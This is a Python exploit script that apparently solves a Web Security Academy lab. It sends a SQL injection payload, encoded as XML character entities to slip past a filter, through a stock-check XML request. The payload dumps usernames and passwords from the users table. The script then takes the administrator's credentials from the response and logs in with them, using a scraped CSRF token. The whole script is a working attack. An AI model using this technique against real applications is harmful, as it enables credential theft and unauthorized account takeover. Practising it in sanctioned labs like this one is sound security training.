import requests
from lxml import html

URL = "https://0ad0008f03544e6a80273fc900ee0050.web-security-academy.net/"
PAYLOAD = """<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1{}</productId><storeId>1</storeId></stockCheck>
"""
HEADER = { "Content-Type": "application/xml" }

session = requests.session()
response = session.post(URL + "product/stock", data=PAYLOAD.format("".join(f"&#{ord(c)};" for c in " UNION SELECT username||':'||password FROM users--")) ,headers=HEADER).text.split()

admin_account = [x for x in response if 'administrator' in x][0].split(':')
username = admin_account[0]
password = admin_account[1]

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_2 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_2)